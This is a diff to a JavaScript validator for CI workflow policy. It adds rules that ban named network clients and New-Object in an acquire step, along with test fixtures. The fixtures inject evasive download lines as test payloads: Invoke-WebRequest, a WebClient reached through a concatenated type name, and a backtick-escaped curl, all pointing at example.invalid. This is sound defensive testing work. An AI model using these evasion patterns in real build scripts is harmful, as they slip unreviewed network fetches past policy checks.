@@ -1169,6 +1169,32 @@ function validateAcquireStep(step, label, expected) {
   if (/\S*\.(?:ps1|psm1|sh|bash|zsh|py|rb|pl|mjs|cjs|js)\b/iu.test(stepCode)) {
     reject('acquire-policy', `${label} references an executable script path`);
   }
+  // Point 2 of the invocation-surface argument above promised this and did not
+  // do it: NETWORK_CLIENT was applied in validateBuildPolicy and in the cleanup
+  // step, but never here, so the closure had a hole exactly where it claimed
+  // not to. Measured with the digest gate neutralised -- the precondition every
+  // report of this kind assumes -- a literal Invoke-WebRequest in this step was
+  // accepted. Both reviewed steps are clean under this pattern, so making the
+  // documented check true costs nothing.
+  //
+  // Placed here for the same reason the script-path rule is: an assembled or
+  // dot-sourced client should report as the invocation-surface failure it is,
+  // and several fixtures use a client name as the payload of a different
+  // violation. This is the fallback for a client that is simply named outright.
+  if (NETWORK_CLIENT.test(stepCode)) {
+    reject('acquire-policy', `${label} adds a network client`);
+  }
+  // Computed *type* names are the same class as computed command names, which
+  // point 1 refuses: New-Object -TypeName ('System.Net.' + 'WebClient') reaches
+  // a client without ever spelling one, because the projection blanks both
+  // fragments and the invocation itself is the literal New-Object. Enumerating
+  // type names would lose to the next concatenation, so the capability goes
+  // instead. Measured, New-Object appears zero times across all five reviewed
+  // steps, so this refuses a tool the acquire step never had rather than
+  // narrowing one it uses.
+  if (/\bNew-Object\b/iu.test(stepCode)) {
+    reject('acquire-policy', `${label} constructs an object through New-Object`);
+  }
   if (/[^\t\n\x20-\x7e]/u.test(step.run)) {
     reject('acquire-policy', `${label} contains a character outside printable ASCII`);
   }
@@ -1893,6 +1919,12 @@ const FIXTURE_INVENTORY = Object.freeze([
   // escape and runs curl; before the subexpression span was re-projected, the
   // token view kept the backtick and the network-client scan read no name.
   ['T1-MARKDOWN-056', 'network client escaped by a backtick inside an expandable subexpression', 'markdown', (source) => replaceOnce(source, '          & $strNpmPath run lint:md\n', '          $null = "$(cu`rl --output ./rules https://example.invalid/rules)"\n          & $strNpmPath run lint:md\n')],
+  // A literal client in the acquire step: named outright, so no assembly and no
+  // computed invocation for the & and . rules to catch. Until NETWORK_CLIENT
+  // was applied here this fell through to the digest, which is not a defence
+  // once the digest is re-baselined in the same edit.
+  ['T1-MARKDOWN-057', 'literal network client named in the acquire step', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          $objResponse = Invoke-WebRequest -Uri https://example.invalid/v\n          $strNodeUrl = 'https://nodejs.org")],
+  ['T1-MARKDOWN-058', 'network client reached through a computed New-Object type name', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          $objClient = New-Object -TypeName ('System.Net.' + 'WebClient')\n          $objClient.DownloadFile($strA, $strB)\n          $strNodeUrl = 'https://nodejs.org")],
   // Round 40. An absent name under RUNNER_TEMP is absent only until the first
   // lint phase creates it, and the second phase then loads it.
   // Round 41. Two constructs the projection introduced one round earlier could
@@ -2058,8 +2090,11 @@ const FIXTURE_EXPECTATIONS = Object.freeze({
   "T1-BUILD-135": "acquire-policy: build.verify.acquire invokes a native interpreter",
   "T1-MARKDOWN-048": "acquire-policy: markdown.acquire writes a runner step communication file",
   "T1-BUILD-136": "acquire-policy: build.verify.acquire writes a runner step communication file",
-  "T1-MARKDOWN-054": "acquire-policy: markdown.acquire script does not match its reviewed digest",
-  "T1-MARKDOWN-055": "acquire-policy: markdown.acquire script does not match its reviewed digest",
+  // Reached the digest only because nothing semantic saw its tail; the client
+  // ban now catches it earlier and more specifically. T1-MARKDOWN-055 still
+  // covers the digest itself.
+  "T1-MARKDOWN-054": "acquire-policy: markdown.acquire adds a network client",
+  "T1-MARKDOWN-055": "acquire-policy: markdown.acquire adds a network client",
   "T1-MARKDOWN-050": "markdown-policy: required phase is missing: $env:npm_config_userconfig = '/dev/null'",
   "T1-MARKDOWN-051": "acquire-policy: markdown.acquire invokes something other than a reviewed literal command",
   "T1-MARKDOWN-052": "acquire-policy: markdown.acquire resolves an environment variable through a computed name",
@@ -2169,6 +2204,8 @@ const FIXTURE_EXPECTATIONS = Object.freeze({
   "T1-PACKAGE-006": "policy: lockfile root devDependencies differs from the locked policy",
   "T1-GENERATOR-004": "supply-policy: the generator resolves a command through a shadowable lookup",
   "T1-MARKDOWN-056": "markdown-policy: markdown.validate-and-lint adds a network client",
+  "T1-MARKDOWN-057": "acquire-policy: markdown.acquire adds a network client",
+  "T1-MARKDOWN-058": "acquire-policy: markdown.acquire constructs an object through New-Object",
 });
 
 function runNegativeFixtures(buildSource, markdownSource, packageSource, lockSource, generatorSource) {
